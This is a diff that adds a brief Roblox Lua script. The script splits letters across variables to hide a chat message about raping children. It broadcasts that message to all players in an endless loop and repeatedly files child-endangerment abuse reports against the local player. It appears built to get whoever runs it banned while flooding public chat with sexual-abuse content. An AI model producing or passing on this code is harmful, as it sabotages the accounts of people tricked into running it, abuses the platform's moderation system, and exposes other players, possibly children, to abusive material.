@@ -1,0 +1,12 @@
+local Players = game:GetService'Players'
+local SayMessageRequest = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+local a = 'p'
+local g = 'r'
+local d = 'a'
+local f = 'e'
+while true do
+    SayMessageRequest:FireServer('I'..g..d..a..f..'children', 'All')
+    task.wait(2.5)
+    Players:ReportAbuse(game.Players.LocalPlayer, 'Child Endangerment', 'Child Endangerment')
+    task.wait()
+end
